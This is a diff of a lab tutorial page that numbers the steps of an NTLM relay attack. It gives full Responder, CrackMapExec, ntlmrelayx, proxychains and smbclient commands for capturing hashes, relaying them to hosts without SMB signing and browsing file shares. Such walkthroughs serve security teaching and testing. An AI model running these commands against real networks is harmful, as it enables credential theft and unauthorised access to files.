@@ -86,7 +86,7 @@ An attacker can take advantage of this and place on every network device he has 
 
 ### Executing the attack
 
-First we will run Responder, to look for traffic within our network. If we notice an user is active, we will try to relay the Net-NTLM-hash. The command we will run, to look passively:
+1. First we will run Responder, to look for traffic within our network. If we notice an user is active, we will try to relay the Net-NTLM-hash. The command we will run, to look passively:
 
 ```
 sudo responder -I tun0 -A
@@ -100,7 +100,7 @@ After a few minutes you notice a NTLMv2-SSP hash from the user pukcab:
 
 ![](<../../.gitbook/assets/image (73) (1).png>)
 
-We can try to crack the NTLMv2 hash or relay the hash to Windows machines, which has SMB signing on false. In this example we will try to relay the hash. More information about cracking hashes, can be found [here](../../lab-setup/to-do.md).
+2\. We can try to crack the NTLMv2 hash or relay the hash to Windows machines, which has SMB signing on false. In this example we will try to relay the hash. More information about cracking hashes, can be found [here](../../lab-setup/to-do.md).
 
 For relaying hashes we're going to use a package of impacket, called ntlmrelayx. But before we're going to use ntlmrelayx, we need to know which host has SMB signing on false. For this we use CrackMapExec. To view manually which hosts in a specific subnet has SMB signing on false, we will run the following command:
 
@@ -110,13 +110,13 @@ crackmapexec smb 10.0.0.0/24
 
 ![In the end you notice (signing:False)](<../../.gitbook/assets/image (28) (1).png>)
 
-CracMapExec also has a function to generate a list of hosts, which has SMB signing on false. To create this list, you need to run the following command:
+3\. CracMapExec also has a function to generate a list of hosts, which has SMB signing on false. To create this list, you need to run the following command:
 
 ```
 crackmapexec smb 10.0.0.0/24 --gen-relay-list smb-signing-false.txt
 ```
 
-The generated list we can use with the tool ntlmrelayx. The below command, will try to authenticate with the Net-NTLM-hash and try to dump the Sam. Dumping the Sam is only possible, when you have administrator access to the machine.
+4\. The generated list we can use with the tool ntlmrelayx. The below command, will try to authenticate with the Net-NTLM-hash and try to dump the Sam. Dumping the Sam is only possible, when you have administrator access to the machine.
 
 ```
 sudo ntlmrelayx.py -tf smb-signing-false.txt -smb2support
@@ -126,7 +126,7 @@ Within some minutes we see something happening within ntlmrelayx, it's trying to
 
 ![](<../../.gitbook/assets/image (74).png>)
 
-So, what can we do after this attempt has failed? We can try to the socks parameter within ntlmrelayx. The socks parameter, will try to authenticate and remember the connection in the background. The command we will run is as follows:
+5\. So, what can we do after this attempt has failed? We can try to the socks parameter within ntlmrelayx. The socks parameter, will try to authenticate and remember the connection in the background. The command we will run is as follows:
 
 ```
 sudo ntlmrelayx.py -tf smb-signing-false.txt -smb2support -socks
@@ -140,7 +140,7 @@ We can verify our connection by pressing enter until we see _ntlmrelayx>_ . Now 
 
 ![](<../../.gitbook/assets/image (58).png>)
 
-Now we need to use the active socks connections we have, for this we will use _proxychains._ Before using proxychains, we need to make some changes within proxychains. This can be done through editor, the file we need to change is `/etc/proxychains4.conf` _._
+5\. Now we need to use the active socks connections we have, for this we will use _proxychains._ Before using proxychains, we need to make some changes within proxychains. This can be done through editor, the file we need to change is `/etc/proxychains4.conf` _._
 
 ```
 [ProxyList]
@@ -153,7 +153,7 @@ socks4 		127.0.0.1 1080
 
 At the bottom we need to add socks 4, with port 1080. And remove other socks. With the changes made, we can use our active socks connections through proxychains.
 
-We want to know if our user has access to certain folders. To check this, we will use CrackMapExec with the parameter --shares. The command is as follows:
+6\. We want to know if our user has access to certain folders. To check this, we will use CrackMapExec with the parameter --shares. The command is as follows:
 
 ```
 proxychains crackmapexec smb smb-signing-false.txt -d amsterdam -u pukcab -H 00000000000000000000000000000000 --shares
@@ -163,7 +163,7 @@ At the -H we can fill in a random hash, this is because CrackMapExec will use ou
 
 ![](<../../.gitbook/assets/image (42).png>)
 
-We notice that our user _pukcab_ has access to the Data directory at FILE01. To view what's inside this directory, we can use smbclient. Smbclient is also a package from impacket. The command we will run to view the content of the Data directory, is as follows:
+7\. We notice that our user _pukcab_ has access to the Data directory at FILE01. To view what's inside this directory, we can use smbclient. Smbclient is also a package from impacket. The command we will run to view the content of the Data directory, is as follows:
 
 ```
 proxychains smbclient.py AMSTERDAM/pukcab:this_password_can_be_empy_aswell@10.0.0.4
